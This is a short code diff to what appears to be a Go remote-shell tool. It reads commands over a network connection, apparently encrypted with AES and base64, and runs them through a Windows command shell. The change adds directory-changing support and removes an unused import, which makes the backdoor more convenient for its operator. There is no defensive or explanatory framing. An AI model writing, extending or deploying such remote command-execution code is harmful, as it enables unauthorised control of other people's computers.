@@ -9,7 +9,6 @@ import (
   "crypto/aes"
   "crypto/cipher"
   "encoding/base64"
-  "fmt"
 )
 
 const buf = 1024
@@ -41,7 +40,11 @@ func run_shell(conn net.Conn) {
         command := string(byte_command)
         if strings.Index(command, "exit") == 0 {
             conn.Close()
-            os.Exit(0)
+            os.Exit(0) 
+
+        } else if strings.Index(command, "cd") == 0 {
+            dir := strings.TrimSuffix(command[3:], "\r\n")
+            os.Chdir(string(dir))
 
         } else {
             shell_arg := []string{"/C", command}
